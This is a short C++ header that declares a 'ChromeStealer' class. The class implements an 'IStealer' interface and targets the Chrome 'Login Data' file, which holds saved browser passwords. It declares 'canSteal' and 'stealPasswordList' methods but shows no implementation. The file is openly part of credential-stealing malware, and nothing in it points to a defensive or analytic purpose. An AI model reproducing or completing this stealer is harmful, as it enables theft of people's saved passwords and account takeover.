#pragma once
#include "IStealer.h"
#include <boost\filesystem.hpp>
#define CHROME_FILE "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

class ChromeStealer : public IStealer 
{
public:
	ChromeStealer();
	~ChromeStealer();
	virtual const bool canSteal(void) const;
	virtual const std::string stealPasswordList(void) const;
private:
	boost::filesystem::path path1;
	std::string appdata_path;
};

